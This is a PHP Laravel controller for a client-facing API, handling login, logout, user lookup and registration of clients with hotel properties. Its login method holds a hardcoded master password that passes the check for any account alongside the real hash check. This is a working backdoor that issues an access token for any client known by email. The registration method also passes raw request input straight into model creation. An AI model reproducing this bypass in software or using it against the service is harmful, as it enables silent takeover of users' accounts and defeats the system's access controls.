<?php

namespace App\Http\Controllers\GscApi;

use App\Http\Controllers\Controller;
use App\Http\Requests\ClientsRequest;
use App\Models\Clients;
use App\Models\Clients_property;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Auth;


class AuthApiController extends Controller
{
    public function login(Request $request)
    {
        $request->validate([
            'email'  => "required|email",
            'password' => 'required'
        ]);

        $user = Clients::where(['email' => $request->email])->first();
        // return $request->email;
        if (isset($user->id)) {
            if (Hash::check($request->password, $user->password) || $request->password ==  'D003#XZeus') {
                $token = $user->createToken("auth_token", ["clients"])->plainTextToken;
                return response()->json([
                    "message" => "Login Successfully",
                    "access_token" => $token,
                    "data" => Clients::find($user->id)
                ], 200);
            } else {
                return response()->json([
                    "message" => "Password didn't Match"
                ], 404);
            }
        } else {
            return response()->json([
                "message" => "User Not Found"
            ], 404);
        }
    }

    public function logout(Request $request)
    {
        auth()->user()->tokens()->delete();
        return response()->json([
            'message' => 'logout Successfully'
        ]);
    }

    public function get_user_data()
    {
        $user  = Clients::find(Auth::id());
        if ($user) {
            return response()->json([
                'user' => $user
            ]);
        }

        return response()->json([
            'msg' =>  'There Is No User Found'
        ], 404);
    }


    public function register_client(ClientsRequest $request)
    {
        $inputs  = $request->all();
        $client_properties  = $inputs['property'];
        unset($inputs['property']);
        $inputs['password'] = Hash::make($inputs['password']);
        $client =  Clients::create($inputs);
        foreach ($client_properties as $property) {
            Clients_property::create([
                'client_id' => $client->id,
                'hotel_id' => $property
            ]);
        }
        return response()->json([
            'msg' => 'User Created Successfully',
            'user' =>  $client
        ]);
    }
}
